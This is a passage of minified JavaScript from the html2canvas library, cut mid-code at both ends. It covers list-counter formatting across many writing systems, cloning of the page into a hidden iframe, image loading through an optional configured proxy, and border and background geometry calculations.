a=n-t+1;return(e<0?"-":"")+(ga(Math.abs(e),a,r,(function(e){return l(Math.floor(e%a)+t)}))+i)},ba=function(e,t,n){void 0===n&&(n=". ");var r=t.length;return ga(Math.abs(e),r,!1,(function(e){return t[Math.floor(e%r)]}))+n},_a=function(e,t,n,r,i,a){if(e<-9999||9999<e)return wa(e,In.CJK_DECIMAL,0<i.length);var o=Math.abs(e),s=i;if(0===o)return t[0]+s;for(var l=0;0<o&&l<=4;l++){var c=o%10;0===c&&Pr(a,1)&&""!==s?s=t[c]+s:1<c||1===c&&0===l||1===c&&1===l&&Pr(a,2)||1===c&&1===l&&Pr(a,4)&&100<e||1===c&&1<l&&Pr(a,8)?s=t[c]+(0<l?n[l-1]:"")+s:1===c&&0<l&&(s=n[l-1]+s),o=Math.floor(o/10)}return(e<0?r:"")+s},wa=function(e,t,n){var r=n?". ":"",i=n?"、":"",a=n?", ":"",o=n?" ":"";switch(t){case In.DISC:return"•"+o;case In.CIRCLE:return"◦"+o;case In.SQUARE:return"◾"+o;case In.DECIMAL_LEADING_ZERO:var s=ya(e,48,57,!0,r);return s.length<4?"0"+s:s;case In.CJK_DECIMAL:return ba(e,"〇一二三四五六七八九",i);case In.LOWER_ROMAN:return va(e,1,3999,ha,In.DECIMAL,r).toLowerCase();case In.UPPER_ROMAN:return va(e,1,3999,ha,In.DECIMAL,r);case In.LOWER_GREEK:return ya(e,945,969,!1,r);case In.LOWER_ALPHA:return ya(e,97,122,!1,r);case In.UPPER_ALPHA:return ya(e,65,90,!1,r);case In.ARABIC_INDIC:return ya(e,1632,1641,!0,r);case In.ARMENIAN:case In.UPPER_ARMENIAN:return va(e,1,9999,fa,In.DECIMAL,r);case In.LOWER_ARMENIAN:return va(e,1,9999,fa,In.DECIMAL,r).toLowerCase();case In.BENGALI:return ya(e,2534,2543,!0,r);case In.CAMBODIAN:case In.KHMER:return ya(e,6112,6121,!0,r);case In.CJK_EARTHLY_BRANCH:return ba(e,"子丑寅卯辰巳午未申酉戌亥",i);case In.CJK_HEAVENLY_STEM:return ba(e,"甲乙丙丁戊己庚辛壬癸",i);case In.CJK_IDEOGRAPHIC:case In.TRAD_CHINESE_INFORMAL:return _a(e,"零一二三四五六七八九","十百千萬","負",i,14);case In.TRAD_CHINESE_FORMAL:return _a(e,"零壹貳參肆伍陸柒捌玖","拾佰仟萬","負",i,15);case In.SIMP_CHINESE_INFORMAL:return _a(e,"零一二三四五六七八九","十百千萬","负",i,14);case In.SIMP_CHINESE_FORMAL:return _a(e,"零壹贰叁肆伍陆柒捌玖","拾佰仟萬","负",i,15);case In.JAPANESE_INFORMAL:return _a(e,"〇一二三四五六七八九","十百千万","マイナス",i,0);case In.JAPANESE_FORMAL:return _a(e,"零壱弐参四伍六七八九","拾百千万","マイナス",i,7);case In.KOREAN_HANGUL_FORMAL:return _a(e,"영일이삼사오육칠팔구","십백천만","마이너스",a,7);case In.KOREAN_HANJA_INFORMAL:return _a(e,"零一二三四五六七八九","十百千萬","마이너스",a,0);case In.KOREAN_HANJA_FORMAL:return _a(e,"零壹貳參四五六七八九","拾百千","마이너스",a,7);case In.DEVANAGARI:return ya(e,2406,2415,!0,r);case In.GEORGIAN:return va(e,1,19999,ma,In.DECIMAL,r);case In.GUJARATI:return ya(e,2790,2799,!0,r);case In.GURMUKHI:return ya(e,2662,2671,!0,r);case In.HEBREW:return va(e,1,10999,Aa,In.DECIMAL,r);case In.HIRAGANA:return ba(e,"あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわゐゑをん");case In.HIRAGANA_IROHA:return ba(e,"いろはにほへとちりぬるをわかよたれそつねならむうゐのおくやまけふこえてあさきゆめみしゑひもせす");case In.KANNADA:return ya(e,3302,3311,!0,r);case In.KATAKANA:return ba(e,"アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヰヱヲン",i);case In.KATAKANA_IROHA:return ba(e,"イロハニホヘトチリヌルヲワカヨタレソツネナラムウヰノオクヤマケフコエテアサキユメミシヱヒモセス",i);case In.LAO:return ya(e,3792,3801,!0,r);case In.MONGOLIAN:return ya(e,6160,6169,!0,r);case In.MYANMAR:return ya(e,4160,4169,!0,r);case In.ORIYA:return ya(e,2918,2927,!0,r);case In.PERSIAN:return ya(e,1776,1785,!0,r);case In.TAMIL:return ya(e,3046,3055,!0,r);case In.TELUGU:return ya(e,3174,3183,!0,r);case In.THAI:return ya(e,3664,3673,!0,r);case In.TIBETAN:return ya(e,3872,3881,!0,r);case In.DECIMAL:default:return ya(e,48,57,!0,r)}},Ca="data-html2canvas-ignore",xa=function(){function e(e,t,n){if(this.context=e,this.options=n,this.scrolledElements=[],this.referenceElement=t,this.counters=new pa,this.quoteDepth=0,!t.ownerDocument)throw new Error("Cloned element does not have an owner document");this.documentElement=this.cloneNode(t.ownerDocument.documentElement)}return e.prototype.toIFrame=function(e,t){var n=this,a=Ma(e,t);if(!a.contentWindow)return Promise.reject("Unable to find iframe window");var o=e.defaultView.pageXOffset,s=e.defaultView.pageYOffset,l=a.contentWindow,c=l.document,u=Ta(a).then((function(){return r(n,void 0,void 0,(function(){var e,n;return i(this,(function(r){switch(r.label){case 0:return this.scrolledElements.forEach(Oa),l&&(l.scrollTo(t.left,t.top),!/(iPad|iPhone|iPod)/g.test(navigator.userAgent)||l.scrollY===t.top&&l.scrollX===t.left||(this.context.logger.warn("Unable to restore scroll position for cloned document"),this.context.windowBounds=this.context.windowBounds.add(l.scrollX-t.left,l.scrollY-t.top,0,0))),e=this.options.onclone,void 0===(n=this.clonedReferenceElement)?[2,Promise.reject("Error finding the "+this.referenceElement.nodeName+" in the cloned document")]:c.fonts&&c.fonts.ready?[4,c.fonts.ready]:[3,2];case 1:r.sent(),r.label=2;case 2:return/(AppleWebKit)/g.test(navigator.userAgent)?[4,Ea(c)]:[3,4];case 3:r.sent(),r.label=4;case 4:return"function"==typeof e?[2,Promise.resolve().then((function(){return e(c,n)})).then((function(){return a}))]:[2,a]}}))}))}));return c.open(),c.write(Fa(document.doctype)+"<html></html>"),La(this.referenceElement.ownerDocument,o,s),c.replaceChild(c.adoptNode(this.documentElement),c.documentElement),c.close(),u},e.prototype.createElementClone=function(e){if(Gr(e,2),aa(e))return this.createCanvasClone(e);if(la(e))return this.createStyleClone(e);var t=e.cloneNode(!1);return oa(t)&&(oa(e)&&e.currentSrc&&e.currentSrc!==e.src&&(t.src=e.currentSrc,t.srcset=""),"lazy"===t.loading&&(t.loading="eager")),t},e.prototype.createStyleClone=function(e){try{var t=e.sheet;if(t&&t.cssRules){var n=[].slice.call(t.cssRules,0).reduce((function(e,t){return t&&"string"==typeof t.cssText?e+t.cssText:e}),""),r=e.cloneNode(!1);return r.textContent=n,r}}catch(e){if(this.context.logger.error("Unable to access cssRules property",e),"SecurityError"!==e.name)throw e}return e.cloneNode(!1)},e.prototype.createCanvasClone=function(e){var t;if(this.options.inlineImages&&e.ownerDocument){var n=e.ownerDocument.createElement("img");try{return n.src=e.toDataURL(),n}catch(t){this.context.logger.info("Unable to inline canvas contents, canvas is tainted",e)}}var r=e.cloneNode(!1);try{r.width=e.width,r.height=e.height;var i=e.getContext("2d"),a=r.getContext("2d");if(a)if(!this.options.allowTaint&&i)a.putImageData(i.getImageData(0,0,e.width,e.height),0,0);else{var o=null!==(t=e.getContext("webgl2"))&&void 0!==t?t:e.getContext("webgl");if(o){var s=o.getContextAttributes();!1===(null==s?void 0:s.preserveDrawingBuffer)&&this.context.logger.warn("Unable to clone WebGL context as it has preserveDrawingBuffer=false",e)}a.drawImage(e,0,0)}return r}catch(t){this.context.logger.info("Unable to clone canvas as it is tainted",e)}return r},e.prototype.cloneNode=function(e){if(Xi(e))return document.createTextNode(e.data);if(!e.ownerDocument)return e.cloneNode(!1);var t=e.ownerDocument.defaultView;if(t&&Yi(e)&&(Ji(e)||Zi(e))){var n=this.createElementClone(e);n.style.transitionProperty="none";var r=t.getComputedStyle(e),i=t.getComputedStyle(e,":before"),a=t.getComputedStyle(e,":after");this.referenceElement===e&&Ji(n)&&(this.clonedReferenceElement=n),ia(n)&&ja(n);for(var o=this.counters.parse(new Vr(this.context,r)),s=this.resolvePseudoContent(e,n,i,ui.BEFORE),l=e.firstChild;l;l=l.nextSibling)Yi(l)&&("SCRIPT"===l.tagName||l.hasAttribute(Ca)||"function"==typeof this.options.ignoreElements&&this.options.ignoreElements(l))||this.options.copyStyles&&Yi(l)&&la(l)||n.appendChild(this.cloneNode(l));s&&n.insertBefore(s,n.firstChild);var c=this.resolvePseudoContent(e,n,a,ui.AFTER);return c&&n.appendChild(c),this.counters.pop(o),r&&(this.options.copyStyles||Zi(e))&&!sa(e)&&Ia(r,n),0===e.scrollTop&&0===e.scrollLeft||this.scrolledElements.push([n,e.scrollLeft,e.scrollTop]),(ca(e)||ua(e))&&(ca(n)||ua(n))&&(n.value=e.value),n}return e.cloneNode(!1)},e.prototype.resolvePseudoContent=function(e,t,n,r){var i=this;if(n){var a=n.content,o=t.ownerDocument;if(o&&a&&"none"!==a&&"-moz-alt-content"!==a&&"none"!==n.display){this.counters.parse(new Vr(this.context,n));var s=new Hr(this.context,n),l=o.createElement("html2canvaspseudoelement");Ia(n,l),s.content.forEach((function(t){if(0===t.type)l.appendChild(o.createTextNode(t.value));else if(22===t.type){var n=o.createElement("img");n.src=t.value,n.style.opacity="1",l.appendChild(n)}else if(18===t.type){if("attr"===t.name){var r=t.values.filter(Re);r.length&&l.appendChild(o.createTextNode(e.getAttribute(r[0].value)||""))}else if("counter"===t.name){var a=t.values.filter(ze),c=a[0],u=a[1];if(c&&Re(c)){var d=i.counters.getCounterValue(c.value),p=u&&Re(u)?Dn.parse(i.context,u.value):In.DECIMAL;l.appendChild(o.createTextNode(wa(d,p,!1)))}}else if("counters"===t.name){var h=t.values.filter(ze),f=(c=h[0],h[1]);if(u=h[2],c&&Re(c)){var A=i.counters.getCounterValues(c.value),m=u&&Re(u)?Dn.parse(i.context,u.value):In.DECIMAL,v=f&&0===f.type?f.value:"",g=A.map((function(e){return wa(e,m,!1)})).join(v);l.appendChild(o.createTextNode(g))}}}else if(20===t.type)switch(t.value){case"open-quote":l.appendChild(o.createTextNode(Dr(s.quotes,i.quoteDepth++,!0)));break;case"close-quote":l.appendChild(o.createTextNode(Dr(s.quotes,--i.quoteDepth,!1)));break;default:l.appendChild(o.createTextNode(t.value))}})),l.className=Na+" "+Da;var c=r===ui.BEFORE?" "+Na:" "+Da;return Zi(t)?t.className.baseValue+=c:t.className+=c,l}}},e.destroy=function(e){return!!e.parentNode&&(e.parentNode.removeChild(e),!0)},e}();(di=ui||(ui={}))[di.BEFORE=0]="BEFORE",di[di.AFTER=1]="AFTER";var Sa,ka,Ma=function(e,t){var n=e.createElement("iframe");return n.className="html2canvas-container",n.style.visibility="hidden",n.style.position="fixed",n.style.left="-10000px",n.style.top="0px",n.style.border="0",n.width=t.width.toString(),n.height=t.height.toString(),n.scrolling="no",n.setAttribute(Ca,"true"),e.body.appendChild(n),n},Ba=function(e){return new Promise((function(t){e.complete?t():e.src?(e.onload=t,e.onerror=t):t()}))},Ea=function(e){return Promise.all([].slice.call(e.images,0).map(Ba))},Ta=function(e){return new Promise((function(t,n){var r=e.contentWindow;if(!r)return n("No window assigned for iframe");var i=r.document;r.onload=e.onload=function(){r.onload=e.onload=null;var n=setInterval((function(){0<i.body.childNodes.length&&"complete"===i.readyState&&(clearInterval(n),t(e))}),50)}}))},Pa=["all","d","content"],Ia=function(e,t){for(var n=e.length-1;0<=n;n--){var r=e.item(n);-1===Pa.indexOf(r)&&t.style.setProperty(r,e.getPropertyValue(r))}return t},Fa=function(e){var t="";return e&&(t+="<!DOCTYPE ",e.name&&(t+=e.name),e.internalSubset&&(t+=e.internalSubset),e.publicId&&(t+='"'+e.publicId+'"'),e.systemId&&(t+='"'+e.systemId+'"'),t+=">"),t},La=function(e,t,n){e&&e.defaultView&&(t!==e.defaultView.pageXOffset||n!==e.defaultView.pageYOffset)&&e.defaultView.scrollTo(t,n)},Oa=function(e){var t=e[0],n=e[1],r=e[2];t.scrollLeft=n,t.scrollTop=r},Na="___html2canvas___pseudoelement_before",Da="___html2canvas___pseudoelement_after",Ra='{\n    content: "" !important;\n    display: none !important;\n}',ja=function(e){Ua(e,"."+Na+":before"+Ra+"\n         ."+Da+":after"+Ra)},Ua=function(e,t){var n=e.ownerDocument;if(n){var r=n.createElement("style");r.textContent=t,e.appendChild(r)}},$a=function(){function e(){}return e.getOrigin=function(t){var n=e._link;return n?(n.href=t,n.href=n.href,n.protocol+n.hostname+n.port):"about:blank"},e.isSameOrigin=function(t){return e.getOrigin(t)===e._origin},e.setContext=function(t){e._link=t.document.createElement("a"),e._origin=e.getOrigin(t.location.href)},e._origin="about:blank",e}(),za=function(){function e(e,t){this.context=e,this._options=t,this._cache={}}return e.prototype.addImage=function(e){var t=Promise.resolve();return this.has(e)||(qa(e)||Ga(e))&&(this._cache[e]=this.loadImage(e)).catch((function(){})),t},e.prototype.match=function(e){return this._cache[e]},e.prototype.loadImage=function(e){return r(this,void 0,void 0,(function(){var t,n,r,a,o=this;return i(this,(function(i){switch(i.label){case 0:return t=$a.isSameOrigin(e),n=!Wa(e)&&!0===this._options.useCORS&&Ci.SUPPORT_CORS_IMAGES&&!t,r=!Wa(e)&&!t&&!qa(e)&&"string"==typeof this._options.proxy&&Ci.SUPPORT_CORS_XHR&&!n,t||!1!==this._options.allowTaint||Wa(e)||qa(e)||r||n?(a=e,r?[4,this.proxy(a)]:[3,2]):[2];case 1:a=i.sent(),i.label=2;case 2:return this.context.logger.debug("Added image "+e.substring(0,256)),[4,new Promise((function(e,t){var r=new Image;r.onload=function(){return e(r)},r.onerror=t,(Ka(a)||n)&&(r.crossOrigin="anonymous"),r.src=a,!0===r.complete&&setTimeout((function(){return e(r)}),500),0<o._options.imageTimeout&&setTimeout((function(){return t("Timed out ("+o._options.imageTimeout+"ms) loading image")}),o._options.imageTimeout)}))];case 3:return[2,i.sent()]}}))}))},e.prototype.has=function(e){return void 0!==this._cache[e]},e.prototype.keys=function(){return Promise.resolve(Object.keys(this._cache))},e.prototype.proxy=function(e){var t=this,n=this._options.proxy;if(!n)throw new Error("No proxy defined");var r=e.substring(0,256);return new Promise((function(i,a){var o=Ci.SUPPORT_RESPONSE_TYPE?"blob":"text",s=new XMLHttpRequest;s.onload=function(){if(200===s.status)if("text"===o)i(s.response);else{var e=new FileReader;e.addEventListener("load",(function(){return i(e.result)}),!1),e.addEventListener("error",(function(e){return a(e)}),!1),e.readAsDataURL(s.response)}else a("Failed to proxy resource "+r+" with status code "+s.status)},s.onerror=a;var l=-1<n.indexOf("?")?"&":"?";if(s.open("GET",""+n+l+"url="+encodeURIComponent(e)+"&responseType="+o),"text"!==o&&s instanceof XMLHttpRequest&&(s.responseType=o),t._options.imageTimeout){var c=t._options.imageTimeout;s.timeout=c,s.ontimeout=function(){return a("Timed out ("+c+"ms) proxying "+r)}}s.send()}))},e}(),Ha=/^data:image\/svg\+xml/i,Va=/^data:image\/.*;base64,/i,Qa=/^data:image\/.*/i,Ga=function(e){return Ci.SUPPORT_SVG_DRAWING||!Xa(e)},Wa=function(e){return Qa.test(e)},Ka=function(e){return Va.test(e)},qa=function(e){return"blob"===e.substr(0,4)},Xa=function(e){return"svg"===e.substr(-3).toLowerCase()||Ha.test(e)};(ka=Sa||(Sa={}))[ka.VECTOR=0]="VECTOR",ka[ka.BEZIER_CURVE=1]="BEZIER_CURVE";var Ya,Ja,Za=function(e,t){return e.length===t.length&&e.some((function(e,n){return e===t[n]}))},eo=function(){function e(e,t){this.type=Sa.VECTOR,this.x=e,this.y=t}return e.prototype.add=function(t,n){return new e(this.x+t,this.y+n)},e}(),to=function(e,t,n){return new eo(e.x+(t.x-e.x)*n,e.y+(t.y-e.y)*n)},no=function(){function e(e,t,n,r){this.type=Sa.BEZIER_CURVE,this.start=e,this.startControl=t,this.endControl=n,this.end=r}return e.prototype.subdivide=function(t,n){var r=to(this.start,this.startControl,t),i=to(this.startControl,this.endControl,t),a=to(this.endControl,this.end,t),o=to(r,i,t),s=to(i,a,t),l=to(o,s,t);return n?new e(this.start,r,o,l):new e(l,s,a,this.end)},e.prototype.add=function(t,n){return new e(this.start.add(t,n),this.startControl.add(t,n),this.endControl.add(t,n),this.end.add(t,n))},e.prototype.reverse=function(){return new e(this.end,this.endControl,this.startControl,this.start)},e}(),ro=function(e){return e.type===Sa.BEZIER_CURVE},io=function(e){var t=e.styles,n=e.bounds,r=Ye(t.borderTopLeftRadius,n.width,n.height),i=r[0],a=r[1],o=Ye(t.borderTopRightRadius,n.width,n.height),s=o[0],l=o[1],c=Ye(t.borderBottomRightRadius,n.width,n.height),u=c[0],d=c[1],p=Ye(t.borderBottomLeftRadius,n.width,n.height),h=p[0],f=p[1],A=[];A.push((i+s)/n.width),A.push((h+u)/n.width),A.push((a+f)/n.height),A.push((l+d)/n.height);var m=Math.max.apply(Math,A);1<m&&(i/=m,a/=m,s/=m,l/=m,u/=m,d/=m,h/=m,f/=m);var v=n.width-s,g=n.height-d,y=n.width-u,b=n.height-f,_=t.borderTopWidth,w=t.borderRightWidth,C=t.borderBottomWidth,x=t.borderLeftWidth,S=Je(t.paddingTop,e.bounds.width),k=Je(t.paddingRight,e.bounds.width),M=Je(t.paddingBottom,e.bounds.width),B=Je(t.paddingLeft,e.bounds.width);this.topLeftBorderDoubleOuterBox=0<i||0<a?ao(n.left+x/3,n.top+_/3,i-x/3,a-_/3,Ya.TOP_LEFT):new eo(n.left+x/3,n.top+_/3),this.topRightBorderDoubleOuterBox=0<i||0<a?ao(n.left+v,n.top+_/3,s-w/3,l-_/3,Ya.TOP_RIGHT):new eo(n.left+n.width-w/3,n.top+_/3),this.bottomRightBorderDoubleOuterBox=0<u||0<d?ao(n.left+y,n.top+g,u-w/3,d-C/3,Ya.BOTTOM_RIGHT):new eo(n.left+n.width-w/3,n.top+n.height-C/3),this.bottomLeftBorderDoubleOuterBox=0<h||0<f?ao(n.left+x/3,n.top+b,h-x/3,f-C/3,Ya.BOTTOM_LEFT):new eo(n.left+x/3,n.top+n.height-C/3),this.topLeftBorderDoubleInnerBox=0<i||0<a?ao(n.left+2*x/3,n.top+2*_/3,i-2*x/3,a-2*_/3,Ya.TOP_LEFT):new eo(n.left+2*x/3,n.top+2*_/3),this.topRightBorderDoubleInnerBox=0<i||0<a?ao(n.left+v,n.top+2*_/3,s-2*w/3,l-2*_/3,Ya.TOP_RIGHT):new eo(n.left+n.width-2*w/3,n.top+2*_/3),this.bottomRightBorderDoubleInnerBox=0<u||0<d?ao(n.left+y,n.top+g,u-2*w/3,d-2*C/3,Ya.BOTTOM_RIGHT):new eo(n.left+n.width-2*w/3,n.top+n.height-2*C/3),this.bottomLeftBorderDoubleInnerBox=0<h||0<f?ao(n.left+2*x/3,n.top+b,h-2*x/3,f-2*C/3,Ya.BOTTOM_LEFT):new eo(n.left+2*x/3,n.top+n.height-2*C/3),this.topLeftBorderStroke=0<i||0<a?ao(n.left+x/2,n.top+_/2,i-x/2,a-_/2,Ya.TOP_LEFT):new eo(n.left+x/2,n.top+_/2),this.topRightBorderStroke=0<i||0<a?ao(n.left+v,n.top+_/2,s-w/2,l-_/2,Ya.TOP_RIGHT):new eo(n.left+n.width-w/2,n.top+_/2),this.bottomRightBorderStroke=0<u||0<d?ao(n.left+y,n.top+g,u-w/2,d-C/2,Ya.BOTTOM_RIGHT):new eo(n.left+n.width-w/2,n.top+n.height-C/2),this.bottomLeftBorderStroke=0<h||0<f?ao(n.left+x/2,n.top+b,h-x/2,f-C/2,Ya.BOTTOM_LEFT):new eo(n.left+x/2,n.top+n.height-C/2),this.topLeftBorderBox=0<i||0<a?ao(n.left,n.top,i,a,Ya.TOP_LEFT):new eo(n.left,n.top),this.topRightBorderBox=0<s||0<l?ao(n.left+v,n.top,s,l,Ya.TOP_RIGHT):new eo(n.left+n.width,n.top),this.bottomRightBorderBox=0<u||0<d?ao(n.left+y,n.top+g,u,d,Ya.BOTTOM_RIGHT):new eo(n.left+n.width,n.top+n.height),this.bottomLeftBorderBox=0<h||0<f?ao(n.left,n.top+b,h,f,Ya.BOTTOM_LEFT):new eo(n.left,n.top+n.height),this.topLeftPaddingBox=0<i||0<a?ao(n.left+x,n.top+_,Math.max(0,i-x),Math.max(0,a-_),Ya.TOP_LEFT):new eo(n.left+x,n.top+_),this.topRightPaddingBox=0<s||0<l?ao(n.left+Math.min(v,n.width-w),n.top+_,v>n.width+w?0:Math.max(0,s-w),Math.max(0,l-_),Ya.TOP_RIGHT):new eo(n.left+n.width-w,n.top+_),this.bottomRightPaddingBox=0<u||0<d?ao(n.left+Math.min(y,n.width-x),n.top+Math.min(g,n.height-C),Math.max(0,u-w),Math.max(0,d-C),Ya.BOTTOM_RIGHT):new eo(n.left+n.width-w,n.top+n.height-C),this.bottomLeftPaddingBox=0<h||0<f?ao(n.left+x,n.top+Math.min(b,n.height-C),Math.max(0,h-x),Math.max(0,f-C),Ya.BOTTOM_LEFT):new eo(n.left+x,n.top+n.height-C),this.topLeftContentBox=0<i||0<a?ao(n.left+x+B,n.top+_+S,Math.max(0,i-(x+B)),Math.max(0,a-(_+S)),Ya.TOP_LEFT):new eo(n.left+x+B,n.top+_+S),this.topRightContentBox=0<s||0<l?ao(n.left+Math.min(v,n.width+x+B),n.top+_+S,v>n.width+x+B?0:s-x+B,l-(_+S),Ya.TOP_RIGHT):new eo(n.left+n.width-(w+k),n.top+_+S),this.bottomRightContentBox=0<u||0<d?ao(n.left+Math.min(y,n.width-(x+B)),n.top+Math.min(g,n.height+_+S),Math.max(0,u-(w+k)),d-(C+M),Ya.BOTTOM_RIGHT):new eo(n.left+n.width-(w+k),n.top+n.height-(C+M)),this.bottomLeftContentBox=0<h||0<f?ao(n.left+x+B,n.top+b,Math.max(0,h-(x+B)),f-(C+M),Ya.BOTTOM_LEFT):new eo(n.left+x+B,n.top+n.height-(C+M))};(Ja=Ya||(Ya={}))[Ja.TOP_LEFT=0]="TOP_LEFT",Ja[Ja.TOP_RIGHT=1]="TOP_RIGHT",Ja[Ja.BOTTOM_RIGHT=2]="BOTTOM_RIGHT",Ja[Ja.BOTTOM_LEFT=3]="BOTTOM_LEFT";var ao=function(e,t,n,r,i){var a=(Math.sqrt(2)-1)/3*4,o=n*a,s=r*a,l=e+n,c=t+r;switch(i){case Ya.TOP_LEFT:return new no(new eo(e,c),new eo(e,c-s),new eo(l-o,t),new eo(l,t));case Ya.TOP_RIGHT:return new no(new eo(e,t),new eo(e+o,t),new eo(l,c-s),new eo(l,c));case Ya.BOTTOM_RIGHT:return new no(new eo(l,t),new eo(l,t+s),new eo(e+o,c),new eo(e,c));case Ya.BOTTOM_LEFT:default:return new no(new eo(l,c),new eo(l-o,c),new eo(e,t+s),new eo(e,t))}},oo=function(e){return[e.topLeftBorderBox,e.topRightBorderBox,e.bottomRightBorderBox,e.bottomLeftBorderBox]},so=function(e){return[e.topLeftPaddingBox,e.topRightPaddingBox,e.bottomRightPaddingBox,e.bottomLeftPaddingBox]},lo=function(e,t,n){this.offsetX=e,this.offsetY=t,this.matrix=n,this.type=0,this.target=6},co=function(e,t){this.path=e,this.target=t,this.type=1},uo=function(e){this.opacity=e,this.type=2,this.target=6},po=function(e){return 1===e.type},ho=function(e){this.element=e,this.inlineLevel=[],this.nonInlineLevel=[],this.negativeZIndex=[],this.zeroOrAutoZIndexOrTransformedOrOpacity=[],this.positiveZIndex=[],this.nonPositionedFloats=[],this.nonPositionedInlineLevel=[]},fo=function(){function e(e,t){if(this.container=e,this.parent=t,this.effects=[],this.curves=new io(this.container),this.container.styles.opacity<1&&this.effects.push(new uo(this.container.styles.opacity)),null!==this.container.styles.transform){var n=this.container.bounds.left+this.container.styles.transformOrigin[0].number,r=this.container.bounds.top+this.container.styles.transformOrigin[1].number,i=this.container.styles.transform;this.effects.push(new lo(n,r,i))}if(this.container.styles.overflowX!==On.VISIBLE){var a=oo(this.curves),o=so(this.curves);Za(a,o)?this.effects.push(new co(a,6)):(this.effects.push(new co(a,2)),this.effects.push(new co(o,4)))}}return e.prototype.getEffects=function(e){for(var t=-1===[Jn.ABSOLUTE,Jn.FIXED].indexOf(this.container.styles.position),n=this.parent,r=this.effects.slice(0);n;){var i=n.effects.filter((function(e){return!po(e)}));if(t||n.container.styles.position!==Jn.STATIC||!n.parent){if(r.unshift.apply(r,i),t=-1===[Jn.ABSOLUTE,Jn.FIXED].indexOf(n.container.styles.position),n.container.styles.overflowX!==On.VISIBLE){var a=oo(n.curves),o=so(n.curves);Za(a,o)||r.unshift(new co(o,6))}}else r.unshift.apply(r,i);n=n.parent}return r.filter((function(t){return Pr(t.target,e)}))},e}(),Ao=function(e,t){for(var n=e instanceof Ni?e.start:1,r=e instanceof Ni&&e.reversed,i=0;i<t.length;i++){var a=t[i];a.container instanceof Oi&&"number"==typeof a.container.value&&0!==a.container.value&&(n=a.container.value),a.listValue=wa(n,a.container.styles.listStyleType,!0),n+=r?-1:1}},mo=function(e,t){switch(t){case 0:return go(e.topLeftBorderBox,e.topLeftPaddingBox,e.topRightBorderBox,e.topRightPaddingBox);case 1:return go(e.topRightBorderBox,e.topRightPaddingBox,e.bottomRightBorderBox,e.bottomRightPaddingBox);case 2:return go(e.bottomRightBorderBox,e.bottomRightPaddingBox,e.bottomLeftBorderBox,e.bottomLeftPaddingBox);case 3:default:return go(e.bottomLeftBorderBox,e.bottomLeftPaddingBox,e.topLeftBorderBox,e.topLeftPaddingBox)}},vo=function(e,t){var n=[];return ro(e)?n.push(e.subdivide(.5,!1)):n.push(e),ro(t)?n.push(t.subdivide(.5,!0)):n.push(t),n},go=function(e,t,n,r){var i=[];return ro(e)?i.push(e.subdivide(.5,!1)):i.push(e),ro(n)?i.push(n.subdivide(.5,!0)):i.push(n),ro(r)?i.push(r.subdivide(.5,!0).reverse()):i.push(r),ro(t)?i.push(t.subdivide(.5,!1).reverse()):i.push(t),i},yo=function(e){var t=e.bounds,n=e.styles;return t.add(n.borderLeftWidth,n.borderTopWidth,-(n.borderRightWidth+n.borderLeftWidth),-(n.borderTopWidth+n.borderBottomWidth))},bo=function(e){var t=e.styles,n=e.bounds,r=Je(t.paddingLeft,n.width),i=Je(t.paddingRight,n.width),a=Je(t.paddingTop,n.width),o=Je(t.paddingBottom,n.width);return n.add(r+t.borderLeftWidth,a+t.borderTopWidth,-(t.borderRightWidth+t.borderLeftWidth+r+i),-(t.borderTopWidth+t.borderBottomWidth+a+o))},_o=function(e,t,n){var r,i,a,o,s=(i=e,0===(r=So(e.styles.backgroundOrigin,t))?i.bounds:2===r?bo(i):yo(i)),l=(o=e,(a=So(e.styles.backgroundClip,t))===ut.BORDER_BOX?o.bounds:a===ut.CONTENT_BOX?bo(o):yo(o)),c=xo(So(e.styles.backgroundSize,t),n,s),u=c[0],d=c[1],p=Ye(So(e.styles.backgroundPosition,t),s.width-u,s.height-d);return[ko(So(e.styles.backgroundRepeat,t),p,c,s,l),Math.round(s.left+p[0]),Math.round(s.top+p[1]),u,d]},wo=function(e){return Re(e)&&e.value===$t.AUTO},Co=function(e){return"number"==typeof e},xo=function(e,t,n){var r=t[0],i=t[1],a=t[2],o=e[0],s=e[1];if(!o)return[0,0];if(Ge(o)&&s&&Ge(s))return[Je(o,n.width),Je(s,n.height)];var l=Co(a);if(Re(o)&&(o.value===$t.CONTAIN||o.value===$t.COVER))return Co(a)?n.width/n.height<a!=(o.value===$t.COVER)?[n.width,n.width/a]:[n.height*a,n.height]:[n.width,n.height];var c=Co(r),u=Co(i),d=c||u;if(wo(o)&&(!s||wo(s)))return c&&u?[r,i]:l||d?d&&l?[c?r:i*a,u?i:r/a]:[c?r:n.width,u?i:n.height]:[n.width,n.height];if(l){var p=0,h=0;return Ge(o)?p=Je(o,n.width):Ge(s)&&(h=Je(s,n.height)),wo(o)?p=h*a:s&&!wo(s)||(h=p/a),[p,h]}var f=null,A=null;if(Ge(o)?f=Je(o,n.width):s&&Ge(s)&&(A=Je(s,n.height)),null===f||s&&!wo(s)||(A=c&&u?f/r*i:n.height),null!==A&&wo(o)&&(f=c&&u?A/i*r:n.width),null!==f&&null!==A)return[f,A];throw new Error("Unable to calculate background-size for element")},So=function(e,t){var n=e[t];return void 0===n?e[0]:n},ko=function(e,t,n,r,i){var a=t[0],o=t[1],s=n[0],l=n[1];switch(e){case Lt.REPEAT_X:return[new eo(Math.round(r.left),Math.round(r.top+o)),new eo(Math.round(r.left+r.width),Math.round(r.top+o)),new eo(Math.round(r.left+r.width),Math.round(l+r.top+o)),new eo(Math.round(r.left),Math.round(l+r.top+o))];case Lt.REPEAT_Y:return[new eo(Math.round(r.left+a),Math.round(r.top)),new eo(Math.round(r.left+a+s),Math.round(r.top)),new eo(Math.round(r.left+a+s),Math.round(r.height+r.top)),new eo(Math.round(r.left+a),Math.round(r.height+r.top))];case Lt.NO_REPEAT:return[new eo(Math.round(r.left+a),Math.round(r.top+o)),new eo(Math.round(r.left+a+s),Math.round(r.top+o)),new eo(Math.round(r.left+a+s),Math.round(r.top+o+l)),new eo(Math.round(r.left+a),Math.round(r.top+o+l))];default:return[new eo(Math.round(i.left),Math.round(i.top)),new eo(Math.round(i.left+i.width),Math.round(i.top)),new eo(Math.round(i.left+i.width),Math.round(i.height+i.top)),new eo(Math.round(i.left),Math.round(i.height+i.top))]}},Mo="Hidden Text",Bo=function(){function e(e){this._data={},this._document=e}return e.prototype.parseMetrics=function(e,t){var 